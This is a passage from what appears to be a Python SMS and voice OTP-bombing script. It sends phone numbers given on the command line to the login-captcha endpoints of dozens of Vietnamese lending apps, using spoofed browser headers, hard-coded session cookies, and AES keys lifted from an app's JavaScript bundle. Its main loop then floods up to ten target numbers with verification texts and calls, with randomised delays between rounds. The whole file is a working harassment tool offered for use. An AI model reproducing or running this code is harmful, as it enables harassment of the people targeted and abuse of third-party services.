        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload1,
            headers=headers
        )


async def combo2(phone_otp):
    headers = build_headers("https://ios-h5.sunmobilefinance.com")
    payload = {
        "app_name": "Sun Mobile",
        "packagename": "sunvay.online.vn",
        "phone": phone_otp,
        "type": 2,
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            headers=headers,
            json=payload
        )


async def call8(phone_otp):
    headers = build_headers("https://ios-h5.marttimeassrt.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Mar Vay",
        "app_package_name": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mvvii.marttimeassrt.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call10(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000000",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers
        )
        res2 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call10_okay(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000001",
        "phone": phone_otp,
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://notice.vaycash.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call11(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfai.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 1, "app_id": "233000000"},
            headers=headers
        )

async def call11_okay(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vkfii.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "233000001"},
            headers=headers
        )

async def call12(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vishi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "231000001"},
            headers=headers
        )

async def call12_okay(phone_otp):
    headers = build_headers("http://sumhanoivn.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://vashi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "app_id": "231000000"},
            headers=headers
        )

async def call13(phone_otp):
    headers = build_headers("https://vn-android-topqcash-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "type": 2,
        "app_package_name": "business.qcash.hbuy",
        "platform": "android",
        "app_id": "227000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vatqi.topqcash.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call13_okay(phone_otp):
    headers = build_headers("https://iosweb.topqcash.net/#/login")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "app_package_name": "business.qcash.hbuy",
        "type": 2,
        "platform": "ios",
        "app_id": "227000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://vitqi.topqcash.net/v2/login/captcha",
            headers=headers,
            json=payload
        )

async def call14(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000000"},
            headers=headers
        )

async def call14_okay(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "http://h5api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000001"},
            headers=headers
        )

async def call15(phone_otp):
    headers = build_headers("https://android-h5.truongtaionline.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Truong Tai Money",
        "app_package_name": "truong.tai.phat.online",
        "platform": "android",
        "app_id": "242000000",
    }
    async with httpx.AsyncClient() as client:
        res1 = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers
        )
        r = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call16(phone_otp):
    headers = build_headers("https://android-h5.dhloantrading.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "DH Loan",
        "app_package_name": "com.dhloan.trading.vaynhanh",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        r1 = await client.post(
            "https://dtaiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000000"},
            headers=headers
        )
        r2 = await client.post(
            "https://dtiiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000001"},
            headers=headers
        )

async def call17(phone_otp):
    headers = build_headers("https://vn-ios-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "ios",
        "app_id": "238000001",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call17_okay(phone_otp):
    headers = build_headers("https://vn-android-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "android",
        "app_id": "238000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call18(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call18_okay(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call19(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call19_okay(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000", "type": 2}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call20(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvai.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000000"},
            headers=headers
        )

async def call20_okay(phone_otp):
    headers = build_headers("https://android-h5.bonmoneydile.com", mode="android")
    headers["x-client-type"] = "phone"
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://bmvii.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000001"},
            headers=headers
        )

async def call21(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvai.nathcopay.com/v2/login/captcha",
            json={**payload, "app_id": "235000000"},
            headers=headers
        )

async def call21_okay(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://oyvii.nathcopay.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "235000001"},
            headers=headers
        )

async def call22(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json=payload,
            headers=headers
        )

async def call22_okay(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call23(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "OKCredit",
        "app_package_name": "com.OKCredit.loan.cash",
        "platform": "android",
        "app_id": "2100000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/OKCredit.apk"
    }
    async with httpx.AsyncClient() as client:
        res = await client.post(
            "https://api.getokcredit.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers
        )

async def call_mydong(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def call_mydong_okay(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
    except:
        pass

async def vay24h(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "vay24h"})
        return r.json()

async def uvwallet(phone_otp: str):
    CF_URL = [
        "https://ok-6fb5.cotenhp2888.workers.dev",
        "https://doaxa--71c050ce533111f1bce0ee650bb23af1.web.val.run"
    ]
    BASE_URL = random.choice(CF_URL)
    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.get(BASE_URL, params={"phone": phone_otp, "fn": "uvwallet"})
        return r.json()

async def itake(phone_otp):
    KEY = b"aajiaozicashmeh5"
    IV  = b"hajiaozicashmeh5"

    def aes_encrypt(payload):
        raw = json.dumps(payload, separators=(",", ":")).encode()
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        encrypted = cipher.encrypt(pad(raw, AES.block_size))
        return base64.b64encode(encrypted).decode()

    mobile = "84" + phone_otp.lstrip("0")
    payload = {
        "phone": mobile,
        "isVoice": False,
        "h5": False,
        "deviceId": ""
    }

    body = aes_encrypt(payload)

    headers = {
        "fpPlatform": "5",
        "appId": "20",
        "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.6itake-moment.com/login",
        "country": "undefined",
        "Origin": "https://h5.6itake-moment.com",
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId": "",
        "version": "1.0.0_4.0.4",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint": "",
        "deviceId": "",
        "platform": "2",
        "token": "undefined",
        "x_x_path": "YCoyft17omVLyvU9+jEIkcL8RUweszQyIGJ8TDVcaw0=",
        "loginPlatform": "H5",
        "marketToken": "undefined",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

    async with httpx.AsyncClient(timeout=30) as client:
        r = await client.post(
            "https://h5.6itake-moment.com/h5/3tcobpsevujcfu4ga4qpdeaddh0gdhd4",
            headers=headers,
            data=body,
        )

        print("STATUS:", r.status_code)

async def main():
    phone_otps = sys.argv[1:11]
    if not phone_otps:
        print("Usage: python main.py <phone_otp1> [phone_otp2] ...")
        sys.exit(1)
    all_funcs = [
        (itake,              30),
        (vay24h,             15),
        (htc_sms,            20),
        (vncredit_sms,       0),
        (call_mfast360,      20),
        (call_vaydep365,     15),
        (qq_sms,             15),
        (call2,              15),
        (mfast,              15),
        (lavi_sms,           15),
        (call13,             15),
        (call3,              15),
        (ptvay_sms,          15),
        (call_senvay,        20),
        (call_hoivan,        10),
        (vncredit_voice,     15),
        (call21,             15),
        (combo2,             15),
        (uvwallet,           15),
        (call1,              15),
        (combo1,             15),
        (achau_sms,          15),
        (call14_okay,         15),
        (petro_sms,          15),
        (call_mydong,        15),
        (call_mydong_okay,    15),
        (call20,             15),
        (call8,              15),
        (call9,              15),
        (call11,             15),
        (call12,             15),
        (random_site,        0),
        (call_hoivan_okay,    10),
        (call12_okay,         15),
        (call14,             15),
        (call10,             15),
        (call19,             15),
        (call11_okay,         15),
        (call18,             15),
        (call15,             15),
        (call20_okay,         15),
        (call16,             15),
        (call22_okay,         15),
        (call19_okay,         15),
        (call17,             15),
        (call23,             15),
        (call22,             15),
        (call21_okay,         15),
        (call13_okay,         15),
        (call18_okay,         15),
        (call10_okay,         15),
        (call17_okay,         15),
        (call_vvay,          15),
        (calll_vvay,         15),
    ]
    async def safe_call(func, phone_otp):
        name = fn.__name__
        try:
            await fn(phone_otp)
            print(f" 📡 {name} {phone_otp} ✅ ")
        except Exception as e:
            print(f" ✘ {name} lỗi: {e}")

    for f_idx, (func, sleep_time) in enumerate(all_funcs, 1):
        await asyncio.gather(*[safe_call(func, phone_otp) for phone_otp in phone_otps])
        if f_idx < len(all_funcs):
            delay = random.uniform(sleep_time, sleep_time + 3)
            print(f"[{func.__name__}] vòng {f_idx} nghỉ {delay:.2f}s")
            await asyncio.sleep(delay)

# ── V-Vay AES-128-CBC helpers (key/IV từ umi.a367d612.js) ──────────────────
_VVAY_KEY = b"aajiaozicashmeh5"
_VVAY_IV  = b"hajiaozicashmeh5"

def _vvay_encrypt(data) -> str:
    """Encrypt dict/str → base64 ciphertext (AES-128-CBC, PKCS7)."""
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import pad as _pad
    if isinstance(data, dict):
        import json as _json
        data = _json.dumps(data, separators=(',', ':'))
    ct = _AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).encrypt(
        _pad(data.encode(), 16)
    )
    return base64.b64encode(ct).decode()

def _vvay_decrypt(b64_str: str) -> dict:
    """Decrypt base64 ciphertext → dict."""
    from Crypto.Cipher import AES as _AES
    from Crypto.Util.Padding import unpad as _unpad
    ct = base64.b64decode(b64_str)
    plain = _unpad(_AES.new(_VVAY_KEY, _AES.MODE_CBC, _VVAY_IV).decrypt(ct), 16)
    return json.loads(plain.decode('utf-8').strip())

# x_x_path = AES encrypt của actual path "/login/requestVerifyCode" (static)
_VVAY_XPATH = _vvay_encrypt("/login/requestVerifyCode")
# Endpoint mới (từ sniff thực tế 2026-07-13)
_VVAY_URL   = "https://h5api.6vn-vayvn.com/h5/yt3tfaf96gxrl8ogd0a6i7tadewrqrxf"

def _vvay_headers() -> dict:
    return {
        "Host": "h5api.6vn-vayvn.com",
        "appId": "4",
        "language": "vi-VN",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5api.6vn-vayvn.com/login",
        "fpPlatform": "5",
        "country": "undefined",
        "Origin": "https://h5api.6vn-vayvn.com",
        "Sec-Fetch-Dest": "empty",
        "fpDeviceId": "",
        "version": "1.0.0_4.0.8",
        "Sec-Fetch-Site": "same-origin",
        "fingerPrint": "",
        "Content-Type": "application/json",
        "platform": "2",
        "token": "undefined",
        "x_x_path": _VVAY_XPATH,
        "loginPlatform": "H5",
        "marketToken": "undefined",
        "Accept": "application/json",
        "Sec-Fetch-Mode": "cors",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
        "deviceId": "",
    }

async def call_vvay(phone_otp: str):
    """V-Vay — SMS OTP (isVoice=false). Body AES-128-CBC encrypted."""
    device_id = uuid.uuid4().hex
    body = _vvay_encrypt({"phone": phone_otp, "isVoice": False, "h5": False, "deviceId": device_id})
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post(
                _VVAY_URL,
                data=body,
                headers=_vvay_headers(),
            )
        resp = _vvay_decrypt(r.text)
        if resp.get("successful"):
            print(f"✅ call_vvay | {phone_otp} | SMS OK")
        else:
            print(f"⚠️ call_vvay | {phone_otp} | {resp}")
    except Exception as e:
        print(f"❌ call_vvay | {phone_otp} | {e}")

async def calll_vvay(phone_otp: str):
    """V-Vay — Voice OTP (isVoice=true). Body AES-128-CBC encrypted."""
    device_id = uuid.uuid4().hex
    body = _vvay_encrypt({"phone": phone_otp, "isVoice": True, "h5": False, "deviceId": device_id})
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post(
                _VVAY_URL,
                data=body,
                headers=_vvay_headers(),
            )
        resp = _vvay_decrypt(r.text)
        if resp.get("successful"):
            print(f"✅ calll_vvay | {phone_otp} | Voice OK")
        else:
            print(f"⚠️ calll_vvay | {phone_otp} | {resp}")
    except Exception as e:
        print(f"❌ calll_vvay | {phone_otp} | {e}")

if __name__ == "__main__":
    asyncio.run(main())
